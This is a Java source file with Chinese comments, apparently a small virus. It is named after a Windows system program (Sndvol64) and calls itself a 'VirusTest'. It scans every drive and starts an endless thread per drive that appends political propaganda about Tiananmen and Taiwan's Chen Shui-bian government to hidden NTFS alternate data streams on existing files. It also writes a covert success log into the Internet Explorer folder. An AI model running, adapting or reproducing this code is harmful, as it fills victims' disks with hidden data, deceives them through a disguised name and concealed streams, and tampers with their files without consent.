
import java.io.*;
public class Sndvol64 extends Thread
{
 static String hideFile[][];
 int diskFileCount[];
 int writeOne=1;
 static int errorWriteFile[];
 File[] files;
 static int disk=0;
 public static void main(String argv[])
 {
 	clearResult();                   //用來將記錄檔給清空的方法
 	Sndvol64 v=new Sndvol64();
  v.searchFile();                  //用來尋找出硬碟中可以用來被寫入隱藏文件的檔案
 	//v.showHideFiles();             //把各磁碟機中可以隱藏的檔案列出來
 	//=====================================================
 	//產生VirusTest11的類別陣列並給予名稱
 	Sndvol64 rv[]=new Sndvol64[disk];
 	for(int i=0;i<disk;i++)
 	{
 	 rv[i]=new Sndvol64();
 	 rv[i].setName(String.valueOf(i));
 	 rv[i].start();	
 	}	
  //=====================================================	 	
 }
 
 public void run()
 {
 	while(true)
 	{
   int k=Integer.parseInt(Thread.currentThread().getName());
   writeHideText(hideFile[k][0]);
  } 
 }	
 
 //此方法用來尋找出硬碟中可以用來被寫入隱藏文件的檔案
 //=====================================================================================
 public  void searchFile() 
 {
  //------------------------------------------------------------------------------
 	//此部份程式碼是用來尋找電腦內部的所有磁碟機代號.......
  File searchDisk[]=File.listRoots();
  String disk[]=new String[searchDisk.length];
  errorWriteFile=new int[searchDisk.length];
 
  for(int count=0;count<searchDisk.length;count++)
  {
   this.disk=searchDisk.length;
   errorWriteFile[count]=0;
   //System.out.println("disk= "+this.disk);	
   disk[count]=searchDisk[count].getPath();	
   //System.out.println(disk[count]);	
  }
  //------------------------------------------------------------------------------
   
   hideFile=new String[disk.length][];
   diskFileCount=new int[disk.length];  
 
  //------------------------------------------------------------------------------
  //此部份程式碼是用來尋找現存各磁碟機根目錄下的檔案出來.......
  for(int diskcount=0;diskcount<disk.length;diskcount++)
  {
   File tempFile=new File(disk[diskcount]);
   files=tempFile.listFiles();     
   int countFile=0;
   try
   {
    //此部份是要讀取出正每一個磁碟機根目錄下的正確File 數目............
    for(int filecount=0;filecount<files.length;filecount++)
    {	
     //***************************************************************************	
     //此部份是用來讀取每個磁碟機根目錄下的檔案數量
     if(files[filecount].isFile())
     {	countFile++; }	 
     //***************************************************************************
    }
    diskFileCount[diskcount]=countFile;
    hideFile[diskcount]=new String[countFile];
    //System.out.println("countFile="+diskFileCount[diskcount]); 
    int j=0;
    for(int i=0;i<files.length;i++)
    {
     if(files[i].isFile())
     {
      hideFile[diskcount][j]=files[i].getPath();	
      // System.out.println(hideFile[diskcount][j]);
      j++;
     }		
    }
   }
   catch(Exception e) { }  
   //***************************************************************************
   //此部份是判斷當發現根目錄沒有檔案可以做偽裝的檔案時！則往下一層目錄尋找檔案
   if(countFile==0)
   {  
   	 try
   	 {
   	  rootNoFiles(diskcount);
   	 }
   	 catch(Exception e)
   	 {
   	 //	System.out.println("光碟機中沒有光碟");
   	 }	 
   }	
   //*************************************************************************** 	
  } 
 //------------------------------------------------------------------------------ 
 }
 //===================================================================================== 
 
 
 
 //===================================================================================== 
 //此方法是當發現根目錄沒有檔案可以做偽裝的檔案時！則往下一層目錄尋找檔案
 public  void rootNoFiles(int diskcount) throws Exception
 {
  //此部份是當發現根目錄沒有檔案可以做偽裝的檔案時！則往下一層目錄尋找檔案
  //System.out.println(disk[diskcount]);
  String fileDirectory=files[0].getPath();	
  //System.out.println(fileDirectory);		
  File rootFileNext=new File(files[0].getPath());
  File [] nextFile=rootFileNext.listFiles();
  int nextCount=0;
  for(int i=0;i<nextFile.length;i++)
  {
   if(nextFile[i].isFile())
  	{ nextCount++; }	
 	}	
	//System.out.println("nextFile="+nextCount);
 	hideFile[diskcount]=new String[nextCount];
 	int ok=0;
 	for(int i=0;i<nextFile.length;i++)
 	{
   if(nextFile[i].isFile())
   {
   	hideFile[diskcount][ok]=nextFile[i].getPath();
    ok++;
   }
   //System.out.println(nextFile[i]);		
  }   	
 }	
 
 //===================================================================================== 
 //把方法是把各磁碟機中可以隱藏的檔案列出來
 public void showHideFiles() 
 {
  System.out.println("====================================");
  System.out.println("目前搜尋到可以做偽裝的檔案.........."); 
  for(String []str:hideFile)
  {
   try
   {	
    for(String data:str) 
    { System.out.println(data);}	
   }
   catch(Exception e) { }	 
  }
 	 	
  System.out.println("===================================="); 
 }
 //===================================================================================== 


 //===================================================================================== 
 //此方法把資料寫入隱葳檔案中
 public void writeHideText(String fileName)
 {
 	String data[]=new String[56];
 	data[0]="【民族意識正在覺醒................................................................】";
  data[1]="【請各位認真的思考吧..............................................................】";
  data[2]="【各位可否還記得六四天安門事件....................................................】";
  data[3]="【有多少愛國的熱血青年走上街頭跟當時的政權抗爭....................................】";
  data[4]="【他們為的是什麼..................................................................】";
  data[5]="【為著是可以讓下一代的生活過得更好................................................】";
  data[6]="";
  data[7]="";
  data[8]="";
  data[9]="【現在讓我們放下所有的思緒】";
  data[10]="";
  data[11]="【讓我們唱這一首歷史的傷口】"; 
  data[12]="==================================================================================";
 	data[13]="《矇上眼睛就以為看不見》";
 	data[14]="《摀上耳朵就以為聽不到》";
  data[15]="《而真理在心中  創痛在胸口》";
  data[16]="《還要忍多久    還要沉默多久》";
  data[17]="";
  data[18]="《如果熱淚可以洗淨塵埃》";
  data[19]="《如果熱血可以換來自由》";
  data[20]="《讓明天能記得今天的怒吼》"; 
  data[21]="《讓世界都看到》";
  data[22]="《歷史的傷口》";
  data[23]="==================================================================================";
  data[24]="";
  data[25]="";
  data[26]="";	
  data[27]="【中華民國是個毫無國際地位的國家---陳水扁的執政團隊是個貪腐無能的政黨---真是可悲呀】";
  data[28]="【各位台灣的同胞呀！請您們拿出自己的良心，擦亮自己的雙眼..........................】";
  data[29]="【請勇敢地嗆扁吧！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！】";
  data[30]="【台灣的前途掌握在您各位自己的手中................................................】";
  data[31]="【好好地看看目前台灣是處在內憂外患的處境..........................................】";
  data[32]="【目前唯有阿扁的執政團隊下台，台灣才會有站起來的機會..............................】";
  data[33]="";
  data[34]="《=======================       這是一個小市民的心聲       =======================》";
  data[35]="";
  data[36]="";
  data[37]="";
  data[38]="";
  data[39]="";
  data[40]="";
  data[41]=""; 
  data[42]="";
  data[43]="";
  data[44]="";
  data[45]="";
  data[46]="";
  data[47]="";
  data[48]=""; 
  data[49]="";
  data[50]="";
  data[51]="";
  data[52]="";
  data[53]="";
  data[54]="";
  data[55]=""; 
  try
  {
  // System.out.println(fileName);	
   
   FileWriter fout=new FileWriter(fileName+":hide.txt",true);
   BufferedWriter bfout=new BufferedWriter(fout);
   for(int kk=0;kk<2;kk++)
   {
   	for(int i=0;i<data.length;i++)
   	{
     bfout.write(data[i]);	
     bfout.newLine();
    } 
   }
   
   if(writeOne==1)
   {
    FileWriter resultPath=new FileWriter("c:\\Program Files\\Internet Explorer\\result.txt",true);
    BufferedWriter bbfout=new BufferedWriter(resultPath);
    String result="目前已將檔案此檔名: "+fileName+"  \"已成功寫入\" 恭禧了...";
    bbfout.write(result);
    bbfout.newLine();
    bbfout.flush();
    bbfout.close();
    writeOne=2;
   } 
   //System.out.println("現在的執行緒是:"+Thread.currentThread().getName());
  // System.out.println("目前hide.txt寫入此檔案名稱: "+fileName+"  \"已成功寫入\" 恭禧了...");
   bfout.close();
   fout.close();
  }	
  catch(FileNotFoundException ffe)
  {	
  // System.out.println();	
  // System.out.println("現在的執行緒是:"+Thread.currentThread().getName());
  // System.out.println("目前發生了FileNotFoundExcepton的例外事件.........");		
  // System.out.println(ffe.getMessage());
  // System.out.println("目前此檔案名稱: "+fileName+ "  \"寫入失敗 \"");
  // System.out.println();	
   
   int index=Integer.parseInt(Thread.currentThread().getName());
   if(errorWriteFile[index]<hideFile[index].length-1)
   {
    errorWriteFile[index]++;
    writeHideText(hideFile[index][errorWriteFile[index]]);
    if(errorWriteFile[index]==hideFile[index].length-1)
    {
     Thread.currentThread().stop();	
    }	
   } 
   
  }	
  catch(IOException ioe)
  {
   System.out.println();	
   System.out.println("我是程式執行到IOExcepton.....");	
   System.out.println(ioe.getMessage());
  }
  catch(Exception e)
  {
   System.out.println();	
   System.out.println("我是程式執行到Exception.....");	
   System.out.println(e.getMessage());
  }	
 }	
//=====================================================================================

//===================================================================================== 
//此方法是用來把記錄檔給清空的................
 public static void clearResult()
 {
  try
  { 	
 	 FileWriter resultPath=new FileWriter("c:\\Program Files\\Internet Explorer\\result.txt");
   BufferedWriter bbfout=new BufferedWriter(resultPath);
   String result="";
   bbfout.write(result);
   bbfout.flush();
   bbfout.close();
  }
  catch(IOException ioe)
  {  }	  	
 }	 
 //===================================================================================== 
}